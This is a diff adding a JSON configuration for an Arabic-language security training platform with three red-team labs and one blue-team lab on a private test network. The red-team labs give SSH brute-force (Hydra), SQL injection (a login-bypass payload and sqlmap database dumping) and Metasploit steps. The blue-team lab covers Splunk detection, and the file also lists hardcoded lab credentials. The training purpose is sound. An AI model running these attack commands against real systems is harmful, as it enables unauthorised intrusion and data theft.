@@ -1,0 +1,213 @@
+{
+  "labs": [
+    {
+      "id": 1,
+      "name_ar": "هجوم Brute Force على SSH",
+      "name_en": "SSH Brute Force Attack",
+      "type": "red",
+      "difficulty": "مبتدئ",
+      "duration": "30 دقيقة",
+      "attack_type": "bruteforce",
+      "console_type": "novnc",
+      "target_ip": "192.168.10.20",
+      "objectives": [
+        "فهم آلية عمل هجمات Brute Force",
+        "استخدام أداة Hydra لتنفيذ الهجوم",
+        "اكتشاف كلمات المرور الضعيفة",
+        "تحليل نتائج الهجوم"
+      ],
+      "steps": [
+        {
+          "title": "تحضير البيئة",
+          "description": "تأكد من تشغيل المختبر والوصول إلى Kali Linux عبر Console"
+        },
+        {
+          "title": "فحص الهدف",
+          "description": "استخدم nmap لفحص المنفذ 22:  nmap -p 22 192.168.10.20"
+        },
+        {
+          "title": "تحضير قائمة كلمات المرور",
+          "description": "استخدم /home/kali/custom-passwords.txt أو أنشئ قائمة خاصة"
+        },
+        {
+          "title": "تنفيذ الهجوم",
+          "description": " hydra -l victim -P /home/kali/custom-passwords.txt ssh://192.168.10.20"
+        },
+        {
+          "title": "تحليل النتائج",
+          "description": "راجع كلمات المرور المكتشفة وسجل الدخول إلى الجهاز: ssh root@192.168.10.20"
+        }
+      ],
+      "vms": [
+        {
+          "name": "Kali Linux (Attacker)",
+          "ip": "192.168.10.10",
+          "vmid": 101
+        },
+        {
+          "name": "Ubuntu Server (Victim)",
+          "ip": "192.168.10.20",
+          "vmid": 102
+        }
+      ]
+    },
+    {
+      "id": 2,
+      "name_ar": "هجوم SQL Injection",
+      "name_en": "SQL Injection Attack",
+      "type": "red",
+      "difficulty": "متوسط",
+      "duration": "45 دقيقة",
+      "attack_type": "sqli",
+      "console_type": "novnc",
+      "target_ip": "192.168.10.20",
+      "objectives": [
+        "فهم ثغرات SQL Injection وأنواعها",
+        "استخدام SQLMap لاستغلال الثغرات",
+        "استخراج بيانات من قاعدة البيانات",
+        "تحليل آثار الهجوم"
+      ],
+      "steps": [
+        {
+          "title": "تحضير البيئة",
+          "description": "تأكد من تشغيل المختبر والوصول إلى Kali Linux"
+        },
+        {
+          "title": "فحص التطبيق",
+          "description": "افتح المتصفح واذهب إلى http://192.168.10.20/dvwa وحدد نقاط الإدخال"
+        },
+        {
+          "title": "اختبار الثغرة يدوياً",
+          "description": "جرب: ' OR '1'='1 في حقل تسجيل الدخول"
+        },
+        {
+          "title": "استخدام SQLMap",
+          "description": "sqlmap -u 'http://192.168.10.20/dvwa/login.php' --data='user=admin&pass=test' --dbs"
+        },
+        {
+          "title": "استخراج البيانات",
+          "description": "sqlmap -u 'http://192.168.10.20/dvwa/login.php' --data='user=admin&pass=test' -D webapp --tables --dump"
+        }
+      ],
+      "vms": [
+        {
+          "name": "Kali Linux (Attacker)",
+          "ip": "192.168.10.10",
+          "vmid": 101
+        },
+        {
+          "name": "Ubuntu Server (Victim)",
+          "ip": "192.168.10.20",
+          "vmid": 102
+        }
+      ]
+    },
+    {
+      "id": 3,
+      "name_ar": "استغلال Metasploit Framework",
+      "name_en": "Metasploit Exploitation",
+      "type": "red",
+      "difficulty": "متقدم",
+      "duration": "60 دقيقة",
+      "attack_type": "exploit",
+      "console_type": "novnc",
+      "target_ip": "192.168.10.20",
+      "objectives": [
+        "استخدام Metasploit Framework",
+        "البحث عن Exploits المناسبة",
+        "تنفيذ Exploitation",
+        "الحصول على Meterpreter Session"
+      ],
+      "steps": [
+        {
+          "title": "فحص الهدف",
+          "description": "nmap -sV -p- 192.168.10.20 للكشف عن الخدمات"
+        },
+        {
+          "title": "تشغيل Metasploit",
+          "description": "افتح Terminal واكتب: msfconsole"
+        },
+        {
+          "title": "البحث عن Exploit",
+          "description": "search vsftpd أو search [اسم الخدمة]"
+        },
+        {
+          "title": "استخدام Exploit(example:openssh)",
+          "description": "use auxiliary/scanner/ssh/ssh_login"
+        },
+        {
+          "title": "إعداد الخيارات",
+          "description": "set RHOSTS 192.168.10.20 ثم show options & set USERNAME victim & set PASSWORD 1234"
+        }, 
+        {
+          "title": "تنفيذ الهجوم",
+          "description": "اكتب exploit أو run للحصول على shell"
+        }
+      ],
+      "vms": [
+        {
+          "name": "Kali Linux (Attacker)",
+          "ip": "192.168.10.10",
+          "vmid": 101
+        },
+        {
+          "name": "Ubuntu Server (Victim)",
+          "ip": "192.168.10.20",
+          "vmid": 102
+        }
+      ]
+    },
+    {
+      "id": 4,
+      "name_ar": "اكتشاف هجوم Brute Force",
+      "name_en": "Detect Brute Force Attack",
+      "type": "blue",
+      "difficulty": "متوسط",
+      "duration": "45 دقيقة",
+      "attack_type": "bruteforce",
+      "console_type": "splunk",
+      "target_ip": "192.168.10.20",
+      "objectives": [
+        "مراقبة محاولات تسجيل الدخول المشبوهة",
+        "استخدام Splunk لتحليل السجلات",
+        "تحديد أنماط هجمات Brute Force",
+        "إنشاء تنبيهات أمنية"
+      ],
+      "steps": [
+        {
+          "title": "الوصول إلى Splunk",
+          "description": "افتح Splunk عبر Console واستخدم: admin / aa123456"
+        },
+        {
+          "title": "البحث عن سجلات SSH",
+          "description": "index=main ssh | stats count by host"
+        },
+        {
+          "title": "تحليل محاولات الفشل",
+          "description": "index=main failed password | timechart count by host"
+        },
+        {
+          "title": "تحديد IP المشبوهة",
+          "description": "راقب العناوين بأكثر من 10 محاولات فاشلة"
+        },
+        {
+          "title": "إنشاء تنبيه",
+          "description": "أنشئ Alert: محاولات فاشلة > 5 في دقيقة"
+        }
+      
+      ],
+      "vms": [
+        {
+          "name": "Kali Linux (Attacker)",
+          "ip": "192.168.10.10",
+          "vmid": 101
+        },
+        {
+          "name": "Ubuntu Server (Victim)",
+          "ip": "192.168.10.20",
+          "vmid": 102
+        }
+      ]
+    }
+  ]
+}
